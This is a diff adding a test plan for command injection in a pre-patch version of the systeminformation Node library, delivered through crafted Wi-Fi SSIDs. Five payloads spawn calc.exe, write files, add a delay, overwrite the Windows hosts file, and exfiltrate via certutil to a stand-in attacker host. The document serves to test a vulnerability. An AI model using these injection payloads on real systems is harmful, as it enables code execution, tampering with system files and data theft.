@@ -1,0 +1,59 @@
+# Command-Injection Exploitation Tests — `systeminformation` (pre-patch)
+
+All payloads are injected via malicious Wi-Fi SSID names.  
+When the vulnerable library calls `execSync("netsh wlan show … \"<SSID>\" …")`, the quotes are broken and arbitrary commands run on Windows.
+
+---
+
+## Test Case 1 – Launch Calculator
+
+| Item        | Value                                                                 |
+|-------------|-----------------------------------------------------------------------|
+| SSID        | `EvilNet"; calc.exe & echo "`                                         |
+| Objective   | Prove code-execution by spawning `calc.exe`.                          |
+| Expected    | The captured `execSync` string contains `calc.exe`.                   |
+
+---
+
+## Test Case 2 – Create a File
+
+| Item        | Value                                                                                              |
+|-------------|----------------------------------------------------------------------------------------------------|
+| SSID        | `DropFile"; echo hacked > C:\\Windows\\Temp\\pwned.txt & echo "`                                   |
+| Objective   | Demonstrate arbitrary file creation.                                                               |
+| Expected    | Command string includes `echo hacked > C:\\Windows\\Temp\\pwned.txt`.                              |
+
+---
+
+## Test Case 3 – Induce a Delay
+
+| Item        | Value                                                             |
+|-------------|-------------------------------------------------------------------|
+| SSID        | `WaitNet"; ping -n 6 127.0.0.1 > nul & echo "`                    |
+| Objective   | Show blind RCE by adding ~5 s latency.                            |
+| Expected    | Command string includes `ping -n 6 127.0.0.1`.                    |
+
+---
+
+## Test Case 4 – Overwrite Hosts File
+
+| Item        | Value                                                                                                    |
+|-------------|----------------------------------------------------------------------------------------------------------|
+| SSID        | `Overwrite"; echo HACKED > C:\\Windows\\System32\\drivers\\etc\\hosts & echo "`                          |
+| Objective   | Prove capability to modify critical system files.                                                        |
+| Expected    | Command string shows `echo HACKED > C:\\Windows\\System32\\drivers\\etc\\hosts`.                         |
+
+---
+
+## Test Case 5 – Exfiltrate Data
+
+| Item        | Value                                                                                              |
+|-------------|----------------------------------------------------------------------------------------------------|
+| SSID        | `Leak"; certutil -urlcache -split -f http://attacker/$(whoami).txt & echo "`                       |
+| Objective   | Verify outbound data exfiltration.                                                                  |
+| Expected    | Command string contains `certutil -urlcache -split -f http://attacker/`.                            |
+
+---
+
+**Safety Note:**  
+Run these tests only in a disposable Windows VM. Each payload would execute immediately under the privileges of the Node.js process if the vulnerable version of `systeminformation` is loaded.
